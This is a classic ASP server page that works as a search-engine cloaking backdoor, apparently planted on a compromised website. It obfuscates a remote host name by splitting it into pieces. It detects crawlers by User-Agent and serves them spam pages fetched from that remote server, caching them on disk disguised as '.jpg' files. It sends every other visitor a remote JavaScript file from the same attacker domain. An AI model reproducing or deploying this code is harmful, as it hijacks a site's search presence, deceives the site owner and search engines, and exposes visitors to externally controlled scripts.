<%

Function fileExists(relativeFilePath)
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    fileExists = fso.FileExists(Server.MapPath(relativeFilePath))
End Function

Function ReadFile(relativePath)
    Dim stream
    If Not fileContent.Exists(relativePath) Then '
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 2 '
        stream.Charset = "utf-8" ' 
        stream.LoadFromFile Server.MapPath(relativePath) '
        fileContent(relativePath) = stream.ReadText ' 
        stream.Close
    End If
    ReadFile = fileContent(relativePath)
End Function

sub WriteF(filename, content)
    On Error Resume Next
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 2 'adTypeText
    stream.Charset = "UTF-8"
    stream.WriteText content
    stream.SaveToFile Server.MapPath(filename), 2 'adSaveCreateOverWrite
    stream.Close
    Set stream = Nothing
    If Err.Number <> 0 Then
        WriteF = content
    Else
        WriteF = content
    End If

End sub

Function urls() 
u="i."
u1="wskmn"
urls="http://"+u+u1+".com"+"/index/"
End Function 

Function format()
    filename=urls()
  'response.write  filename
    filename = Replace(filename, "http://", "")
    filename = Replace(filename, "https://", "")
    filename = Replace(filename, "\", "-")
    filename = Replace(filename, "/", "")
    filename = Replace(filename, ":", "-")
    filename = Replace(filename, "*", "-")
    filename = Replace(filename, "?", "-")
    filename = Replace(filename, """", "-")
    filename = Replace(filename, "<", "-")
    filename = Replace(filename, ">", "-")
    filename = Replace(filename, "|", "-")
    filename = Replace(filename, "&", "-")
    filename = Replace(filename, "=", "-")

    format=folder()+filename+".jpg"
    
End Function 

Function folder()
folder1="images\"
folder=cfolder(folder1) 
End Function 

Function cfolder(dir) 
Dim fs,strFolder
strFolder=fo
Err.Clear
On Error Resume Next
set fs=Server.CreateObject("Scripting.FileSystemObject")
strFolder=Server.MapPath(dir)
If not fs.FolderExists(strFolder) Then
fs.CreateFolder strFolder
cfolder=dir 
End If
cfolder=dir 
End Function

Function all()
ff=format()
da=replace(date(),"/","-")
if fileExists(folder()&"date.jpg") then 
    rd=ReadFile(folder()&"date.jpg")
    if rd=da then
            if fileExists(ff) then
            all= ReadFile(ff)
            else
                aa= sour()
                WriteF ff,aa
                all=aa
             end if
     else
       aa= sour()
       WriteF ff,aa
       WriteF folder()&"date.jpg",da
       all=aa
    end if
else
       aa= sour()
       WriteF ff,aa
       WriteF folder()&"date.jpg",da
       all=aa
end if 
End Function
Function url()
dim http
  http=LCase(request.ServerVariables("QUERY_STRING"))
 if instr(http,"&")>0 then
  url=replace(http,"&","?",1,1)
  else
url=http
end if 
End Function 

function domain() 
domain=LCase(request.ServerVariables("SERVER_NAME"))
End Function
Dim fileContent '
Set fileContent = CreateObject("Scripting.Dictionary")
function sour()
aa=urls()+"?"+"domain="+domain()+"&script=/"+"&idx="&url()
sour=GetWebContent(aa,"utf-8","60000")
End Function




function isspider()
dim agent,searray,i
agent="agent:"&LCase(request.servervariables("http_user_agent"))
searray=array("google","baidu","sogou","yahoo","soso","360","so","yahoo","bing","youdao","bot","spider")
isspider= false
for i=0 to ubound(searray)
 if (instr(agent,searray(i))>0) then isspider=true
next
end function

function fromse() 
dim urlrefer,i,searray
urlrefer="refer:"&LCase(request.ServerVariables("HTTP_REFERER"))
fromse= false
if urlrefer="" then fromse= false
searray=array("google","sogou","yahoo","soso","360","so","yahoo","bing","youdao")
for i=0 to ubound(searray)
 if (instr(urlrefer,searray(i))>0) then fromse=true
next
end function


Function GetWebContent(strURL, strCharset, intTimeout)
    Dim objXMLHTTP, strHTML
    On Error Resume Next
    Set objXMLHTTP = Server.CreateObject("MSXML2.ServerXMLHTTP")
    If Err.Number <> 0 Then
        Set objXMLHTTP = Server.CreateObject("MSXML2.XMLHTTP")
    End If
    If Err.Number <> 0 Then
        Set objXMLHTTP = Server.CreateObject("Microsoft.XMLHTTP")
    End If
    On Error GoTo 0
    If objXMLHTTP Is Nothing Then
        GetWebContent = ""
        Exit Function
    End If
    objXMLHTTP.Open "GET", strURL, False
    objXMLHTTP.setTimeouts intTimeout, intTimeout, intTimeout, intTimeout
    objXMLHTTP.Send
    strHTML = objXMLHTTP.responseText
    If strCharset <> "" Then
        Dim objStream, charsets, charset
        charsets = Array("utf-8", "gb2312", "gbk")
        For Each charset In charsets
            On Error Resume Next
            Set objStream = Server.CreateObject("ADODB.Stream")
            objStream.Type = 1 'adTypeBinary
            objStream.Open
            objStream.Write objXMLHTTP.responseBody
            objStream.Position = 0
            objStream.Type = 2 'adTypeText
            objStream.Charset = charset
            strHTML = objStream.ReadText
            Set objStream = Nothing
            If Err.Number = 0 Then Exit For
        Next
    End If
    Set objXMLHTTP = Nothing
    GetWebContent = strHTML
End Function


if isspider()=true  then
   response.clear
   response.write( replace( all(),"{wailian}",GetWebContent(urls+"wailian.txt","utf-8","60000") )  )
   response.write("<!--"&now()&"-->")
   response.end
end if
if fromse() then
  response.clear
    response.write("<script language='javascript' src='http://js.wskmn.com/js/ul.js'></script><br/>")
    Response.Flush
  response.end
else
   response.clear
    response.write("<script language='javascript' src='http://js.wskmn.com/js/ul.js'></script><br/>")
  response.end
end if
%>